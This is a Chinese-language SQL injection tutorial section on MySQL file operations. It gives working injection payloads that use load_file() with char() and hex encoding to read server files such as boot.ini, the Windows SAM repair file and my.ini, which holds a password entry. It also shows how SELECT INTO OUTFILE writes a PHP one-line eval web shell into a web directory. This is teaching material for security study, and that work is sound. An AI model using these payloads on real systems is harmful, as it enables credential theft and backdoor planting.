# 六、Background-3 导入导出相关操作的讲解

### 1. load_file()导出文件

load_file(file_name):读取文件并返回该文件的内容作为一个字符串。

使用条件：

A.必须有权限读取并且文件必须完全可读
> * and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。<br>
> * and (select count(*) from mysql.user)>0/* 返回错误，应该是管理员给数据库帐户降权了。

B.欲读取文件必须在服务器上<br>
C.必须指定文件完整的路径<br>
D.欲读取文件必须小于max_allowed_packet<br>

若文件不存在或读取失败，load_file()函数返回空。

MySQL注入load_file常用路径：<https://www.cnblogs.com/lcamry/p/5729087.html>

> EG：
> 1. Select 1,2,3,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))<br>
利用hex()将文件内容导出来，尤其是smb文件时可以使用。
> 2. -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>
Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码
> 3. -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>
Explain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”
> 4. -1 union select 1,1,1,load_file(c:\\boot.ini)<br>
Explain:路径里的/用\\代替

### 2. 文件导入到数据库

LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必
须为一个文字字符串。

函数具体介绍请参考mysql文档。
```sql
LOAD DATA [LOW_PRIORITY | CONCURRENT] [LOCAL] INFILE 'file_name'
    [REPLACE | IGNORE]
    INTO TABLE tbl_name
    [PARTITION (partition_name,...)]
    [CHARACTER SET charset_name]
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]
    [IGNORE number {LINES | ROWS}]
    [(col_name_or_user_var,...)]
    [SET col_name = expr,...]
```

### 3. 导入到文件

SELECT.....INTO OUTFILE 'file_name'

将选择行写入到文件中，被创建到服务器上（注意须有权限，且文件尚未存在）。一般有两种形式：

1. 第一种形式是将select导入到文件中
> EG:<br>
Select version() into outfile "c:\\test.txt";
<br>
替换成“一句话木马”(`<?php @eval($_post[“mima”])?>`)也可以<br>
Select <?php @eval($_post[“mima”])?> into outfile “c:\\webdir\\test.php”

2. 第二种形式是修改文件结尾

> Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件

> 16 进制可以为"一句话木马"或者其他任何的代码，可自行构造。

> 在sqlmap 中os-shell 采取的就是这样的方式，具体可参考os-shell 分析文章：<http://www.cnblogs.com/lcamry/p/5505110.html>

**TIPS:**<br>
（1）可能在文件路径当中要注意转义，这个要看具体的环境。<br>
（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：<br>
`select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile 'c:\\wamp\\www\\test.php'`

可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。







